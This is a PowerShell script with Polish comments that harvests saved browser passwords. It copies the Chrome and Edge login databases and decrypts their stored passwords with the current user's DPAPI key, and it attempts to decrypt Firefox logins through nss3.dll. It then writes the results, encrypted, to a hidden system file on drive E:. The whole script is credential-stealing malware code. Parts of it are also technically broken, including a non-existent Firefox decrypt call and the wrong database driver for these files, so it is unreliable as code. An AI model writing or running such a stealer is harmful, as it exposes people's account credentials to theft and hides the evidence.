function Extract-BrowserData {
    $browserData = @()

    # Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        try {
            $tempPath = [System.IO.Path]::GetTempFileName()
            Copy-Item $chromePath $tempPath -Force
            
            $connectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempPath;"
            $connection = New-Object System.Data.OleDb.OleDbConnection($connectionString)
            $connection.Open()
            
            $query = "SELECT origin_url, username_value, password_value FROM logins"
            $command = New-Object System.Data.OleDb.OleDbCommand($query, $connection)
            $reader = $command.ExecuteReader()
            
            $chromePasswords = @()
            while ($reader.Read()) {
                $encryptedBytes = $reader.GetValue(2)
                try {
                    $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $encryptedBytes,
                        $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                }
                catch {
                    $password = "[DECRYPTION_FAILED]"
                }
                
                $chromePasswords += [PSCustomObject]@{
                    URL = $reader.GetString(0)
                    Username = $reader.GetString(1)
                    Password = $password
                    Browser = "Chrome"
                }
            }
            $browserData += $chromePasswords
        }
        catch {
            $browserData += [PSCustomObject]@{
                Browser = "Chrome"
                Error = $_.Exception.Message
            }
        }
        finally {
            if ($connection) { $connection.Close() }
            if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
        }
    }

    # Microsoft Edge (Chromium)
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        try {
            $tempPath = [System.IO.Path]::GetTempFileName()
            Copy-Item $edgePath $tempPath -Force
            
            $connectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempPath;"
            $connection = New-Object System.Data.OleDb.OleDbConnection($connectionString)
            $connection.Open()
            
            $query = "SELECT origin_url, username_value, password_value FROM logins"
            $command = New-Object System.Data.OleDb.OleDbCommand($query, $connection)
            $reader = $command.ExecuteReader()
            
            $edgePasswords = @()
            while ($reader.Read()) {
                $encryptedBytes = $reader.GetValue(2)
                try {
                    $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $encryptedBytes,
                        $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                }
                catch {
                    $password = "[DECRYPTION_FAILED]"
                }
                
                $edgePasswords += [PSCustomObject]@{
                    URL = $reader.GetString(0)
                    Username = $reader.GetString(1)
                    Password = $password
                    Browser = "Microsoft Edge"
                }
            }
            $browserData += $edgePasswords
        }
        catch {
            $browserData += [PSCustomObject]@{
                Browser = "Microsoft Edge"
                Error = $_.Exception.Message
            }
        }
        finally {
            if ($connection) { $connection.Close() }
            if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
        }
    }

    # Firefox
    $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
    foreach ($profile in $ffProfiles) {
        $loginsPath = Join-Path $profile.FullName "logins.json"
        $keyPath = Join-Path $profile.FullName "key4.db"
        
        if (Test-Path $loginsPath -and Test-Path $keyPath) {
            try {
                # Pobierz klucz główny Firefox
                $nssPath = "$env:ProgramFiles\Mozilla Firefox\nss3.dll"
                if (-not (Test-Path $nssPath)) {
                    $nssPath = "${env:ProgramFiles(x86)}\Mozilla Firefox\nss3.dll"
                }
                
                if (Test-Path $nssPath) {
                    Add-Type -Path $nssPath
                    
                    $loginsJson = Get-Content $loginsPath -Raw | ConvertFrom-Json
                    $ffPasswords = @()
                    
                    foreach ($login in $loginsJson.logins) {
                        try {
                            $decryptedUser = [Mozilla.Pkix]::Decrypt($login.encryptedUsername)
                            $decryptedPass = [Mozilla.Pkix]::Decrypt($login.encryptedPassword)
                            
                            $ffPasswords += [PSCustomObject]@{
                                URL = $login.hostname
                                Username = $decryptedUser
                                Password = $decryptedPass
                                Browser = "Firefox"
                                Profile = $profile.Name
                            }
                        }
                        catch {
                            $ffPasswords += [PSCustomObject]@{
                                URL = $login.hostname
                                Username = "[DECRYPTION_FAILED]"
                                Password = "[DECRYPTION_FAILED]"
                                Browser = "Firefox"
                                Profile = $profile.Name
                            }
                        }
                    }
                    $browserData += $ffPasswords
                }
            }
            catch {
                $browserData += [PSCustomObject]@{
                    Browser = "Firefox"
                    Profile = $profile.Name
                    Error = $_.Exception.Message
                }
            }
        }
    }

    # Eksport zaszyfrowanych danych
    $jsonData = $browserData | ConvertTo-Json -Depth 5
    $encryptedData = Encrypt-Data -Data $jsonData
    $outputPath = "E:\BrowserData_$(Get-Date -Format 'yyyyMMdd_HHmmss').enc"
    $encryptedData | Out-File $outputPath
    attrib +s +h $outputPath
    
    return $outputPath
}

# Funkcja pomocnicza do szyfrowania (musi być dostępna w zakresie)
function Encrypt-Data {
    param($Data)
    $secure = ConvertTo-SecureString $Data -AsPlainText -Force
    return ConvertFrom-SecureString $secure
}
